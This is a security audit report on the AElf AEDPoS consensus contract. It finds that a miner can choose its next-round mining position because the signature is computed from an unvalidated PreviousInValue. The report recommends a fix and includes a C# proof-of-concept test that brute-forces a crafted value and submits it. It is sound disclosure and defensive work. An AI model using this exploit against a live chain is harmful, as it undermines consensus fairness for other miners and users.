# Audit Report

## Title
Miners Can Manipulate Next Round Mining Order Through Invalid PreviousInValue

## Summary
Miners can manipulate their mining position in the next consensus round by providing arbitrary `previousInValue` that fails validation. The validation correctly rejects the invalid value, but the signature calculation still uses the attacker-controlled input, allowing miners to brute-force favorable mining positions without detection.

## Finding Description

The vulnerability exists in the consensus extra data generation flow where signature calculation uses miner-provided `previousInValue` even after validation fails.

When a miner provides an invalid `previousInValue` through the trigger information:

**1. Validation Rejects Invalid Value**: The validation correctly detects that the hash of `triggerInformation.PreviousInValue` does not match the previous round's `OutValue`, and sets the local variable `previousInValue = Hash.Empty`. [1](#0-0) 

**2. Signature Uses Invalid Value**: However, the signature is calculated using `previousRound.CalculateSignature(triggerInformation.PreviousInValue)` - the ORIGINAL attacker-controlled value, not the validated `Hash.Empty`. [2](#0-1) 

**3. Signature Determines Mining Order**: This signature is passed to `ApplyNormalConsensusData`, where it directly determines `supposedOrderOfNextRound` via modulus operation, which becomes the miner's `FinalOrderOfNextRound`. [3](#0-2) 

**4. Validation Allows Empty PreviousInValue**: During block validation, the `UpdateValueValidationProvider` explicitly allows `Hash.Empty`, bypassing any validation that the signature matches the stored `previousInValue`. [4](#0-3) 

**5. Next Round Uses Manipulated Order**: When the next round is generated, miners are ordered by `FinalOrderOfNextRound`. [5](#0-4) 

The signature calculation mechanism combines the input value with previous round signatures via XOR and hashing: [6](#0-5) 

A miner can exploit this by:
- Retrieving `previousRound` state (public blockchain data)
- Brute-forcing values `X` where `CalculateSignature(X) % minersCount + 1 == desiredOrder`
- Submitting crafted `X` as `PreviousInValue` in trigger information
- Achieving desired mining position while validation passes (with `Hash.Empty` stored)

## Impact Explanation

**Critical Consensus Integrity Compromise**: This vulnerability breaks the fundamental consensus invariant that miners cannot choose their mining schedule position. The impact includes:

1. **Front-running Advantages**: Miners can position themselves first in the round to collect maximum transaction fees from high-value transactions.

2. **Strategic Timing Control**: Miners can select specific time slots that align with external events or coordinate with other protocol actions.

3. **Unfair Resource Allocation**: Mining order directly affects block production opportunities, reward distribution, and network influence.

4. **Protocol-Wide Effect**: Every consensus participant is affected as the randomness of mining order - a core security property of AEDPoS - is compromised.

5. **Compounding Effect**: Multiple miners exploiting this simultaneously could completely distort the intended fair distribution of mining opportunities.

The severity is HIGH because it fundamentally undermines consensus fairness without requiring any special privileges beyond being an active miner.

## Likelihood Explanation

**High Likelihood - Trivially Exploitable**:

1. **Accessible Entry Point**: Any miner calls this during block production through the standard consensus flow.

2. **Attacker Control**: The trigger information is prepared off-chain before calling the contract. A malicious miner running modified node software can alter the `PreviousInValue` field.

3. **Trivial Computation**: The attack requires only:
   - Reading public blockchain state (`previousRound`)
   - Brute-forcing ~17-23 hash operations (typical miner count) to find a value with the desired modulus property
   - Modern CPUs can perform millions of hashes per second, making this feasible in milliseconds

4. **Undetectable**: The failed validation with `Hash.Empty` appears identical to legitimate scenarios where a miner didn't participate in the previous round or lost their InValue.

5. **Strong Economic Incentive**: Better mining positions translate directly to higher transaction fees and strategic advantages.

6. **No Mitigation**: There is no validation that verifies the signature was correctly derived from the stored `previousInValue`. The validation providers only check basic properties, not signature derivation correctness. [7](#0-6) 

## Recommendation

The fix should ensure that signature calculation uses the same value that gets validated and stored. Modify `GetConsensusExtraDataToPublishOutValue` to calculate the signature using the validated `previousInValue` variable instead of the raw `triggerInformation.PreviousInValue`:

**Change line 92 from:**
```csharp
signature = previousRound.CalculateSignature(triggerInformation.PreviousInValue);
```

**To:**
```csharp
signature = previousRound.CalculateSignature(previousInValue);
```

This ensures that if validation fails and `previousInValue` is set to `Hash.Empty`, the signature will also be calculated from `Hash.Empty`, maintaining consistency between the stored value and the signature used to determine mining order.

Additionally, consider adding validation in `UpdateValueValidationProvider` to verify that when `previousInValue` is not `Hash.Empty`, the signature was correctly derived from it by recalculating and comparing.

## Proof of Concept

```csharp
[Fact]
public async Task MinerCanManipulateMiningOrderWithInvalidPreviousInValue()
{
    // Setup: Initialize consensus with multiple miners
    var minersCount = 17;
    var miners = GenerateMiners(minersCount);
    await InitializeConsensus(miners);
    
    // Attacker is miner at index 10, wants to be position 1 in next round
    var attackerKeyPair = miners[10];
    var attackerPubkey = attackerKeyPair.PublicKey.ToHex();
    
    // Retrieve previous round (public data)
    var previousRound = await ConsensusStub.GetPreviousRoundInformation.CallAsync(new Empty());
    
    // Brute-force to find PreviousInValue that produces desired signature
    Hash craftedPreviousInValue = null;
    for (int i = 0; i < 1000; i++) 
    {
        var testValue = HashHelper.ComputeFrom($"attacker_craft_{i}");
        var testSignature = previousRound.CalculateSignature(testValue);
        var supposedOrder = Math.Abs(testSignature.ToInt64() % minersCount) + 1;
        
        if (supposedOrder == 1) // Desired position
        {
            craftedPreviousInValue = testValue;
            break;
        }
    }
    
    Assert.NotNull(craftedPreviousInValue); // Should find within ~17 attempts
    
    // Create malicious trigger information with crafted value
    var maliciousTriggerInfo = new AElfConsensusTriggerInformation
    {
        Pubkey = ByteString.CopyFrom(attackerKeyPair.PublicKey),
        InValue = HashHelper.ComputeFrom("normal_invalue"),
        PreviousInValue = craftedPreviousInValue, // Invalid value that fails validation
        Behaviour = AElfConsensusBehaviour.UpdateValue
    };
    
    // Call GetConsensusExtraData with crafted trigger
    var extraData = await ConsensusStub.GetConsensusExtraData.CallAsync(
        maliciousTriggerInfo.ToBytesValue()
    );
    
    var headerInfo = AElfConsensusHeaderInformation.Parser.ParseFrom(extraData.Value);
    var attackerInfo = headerInfo.Round.RealTimeMinersInformation[attackerPubkey];
    
    // Verify: Attacker achieved desired mining position
    Assert.Equal(1, attackerInfo.FinalOrderOfNextRound);
    
    // Verify: PreviousInValue stored as Hash.Empty (validation "passed")
    Assert.Equal(Hash.Empty, attackerInfo.PreviousInValue);
    
    // Produce block and transition to next round
    await ProduceBlockAndTransitionRound();
    
    var nextRound = await ConsensusStub.GetCurrentRoundInformation.CallAsync(new Empty());
    
    // Verify: Attacker is first miner in next round
    var firstMiner = nextRound.RealTimeMinersInformation.Values.First(m => m.Order == 1);
    Assert.Equal(attackerPubkey, firstMiner.Pubkey);
}
```

**Notes**

This vulnerability exists because of a subtle but critical disconnect in the code flow: the validation logic correctly rejects invalid `previousInValue` and sets it to `Hash.Empty`, but the signature calculation (which determines mining order) happens using the original invalid value. The validation then explicitly allows `Hash.Empty`, creating a bypass where miners can manipulate their next-round position through brute-forced invalid values.

The attack is computationally trivial because finding a hash with a specific modulus property requires only ~N attempts on average, where N is the number of miners (typically 17-23), not 2^256 attempts. This makes it exploitable within milliseconds on modern hardware.

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_GetConsensusBlockExtraData.cs (L80-90)
```csharp
                if (previousRound.RealTimeMinersInformation.ContainsKey(pubkey) &&
                    HashHelper.ComputeFrom(triggerInformation.PreviousInValue) !=
                    previousRound.RealTimeMinersInformation[pubkey].OutValue)
                {
                    Context.LogDebug(() => "Failed to produce block at previous round?");
                    previousInValue = Hash.Empty;
                }
                else
                {
                    previousInValue = triggerInformation.PreviousInValue;
                }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_GetConsensusBlockExtraData.cs (L92-92)
```csharp
                signature = previousRound.CalculateSignature(triggerInformation.PreviousInValue);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_ApplyNormalConsensusData.cs (L19-44)
```csharp
        var sigNum = signature.ToInt64();

        var supposedOrderOfNextRound = GetAbsModulus(sigNum, minersCount) + 1;

        // Check the existence of conflicts about OrderOfNextRound.
        // If so, modify others'.
        var conflicts = RealTimeMinersInformation.Values
            .Where(i => i.FinalOrderOfNextRound == supposedOrderOfNextRound).ToList();

        foreach (var orderConflictedMiner in conflicts)
            // Multiple conflicts is unlikely.

            for (var i = supposedOrderOfNextRound + 1; i < minersCount * 2; i++)
            {
                var maybeNewOrder = i > minersCount ? i % minersCount : i;
                if (RealTimeMinersInformation.Values.All(m => m.FinalOrderOfNextRound != maybeNewOrder))
                {
                    RealTimeMinersInformation[orderConflictedMiner.Pubkey].FinalOrderOfNextRound =
                        maybeNewOrder;
                    break;
                }
            }

        RealTimeMinersInformation[pubkey].SupposedOrderOfNextRound = supposedOrderOfNextRound;
        // Initialize FinalOrderOfNextRound as the value of SupposedOrderOfNextRound
        RealTimeMinersInformation[pubkey].FinalOrderOfNextRound = supposedOrderOfNextRound;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/UpdateValueValidationProvider.cs (L46-46)
```csharp
        if (previousInValue == Hash.Empty) return true;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L26-36)
```csharp
        foreach (var minerInRound in minersMinedCurrentRound.OrderBy(m => m.FinalOrderOfNextRound))
        {
            var order = minerInRound.FinalOrderOfNextRound;
            nextRound.RealTimeMinersInformation[minerInRound.Pubkey] = new MinerInRound
            {
                Pubkey = minerInRound.Pubkey,
                Order = order,
                ExpectedMiningTime = currentBlockTimestamp.AddMilliseconds(miningInterval.Mul(order)),
                ProducedBlocks = minerInRound.ProducedBlocks,
                MissedTimeSlots = minerInRound.MissedTimeSlots
            };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L110-115)
```csharp
    public Hash CalculateSignature(Hash inValue)
    {
        return HashHelper.XorAndCompute(inValue,
            RealTimeMinersInformation.Values.Aggregate(Hash.Empty,
                (current, minerInRound) => HashHelper.XorAndCompute(current, minerInRound.Signature)));
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L79-83)
```csharp
            case AElfConsensusBehaviour.UpdateValue:
                validationProviders.Add(new UpdateValueValidationProvider());
                // Is confirmed lib height and lib round number went down? (Which should not happens.)
                validationProviders.Add(new LibInformationValidationProvider());
                break;
```
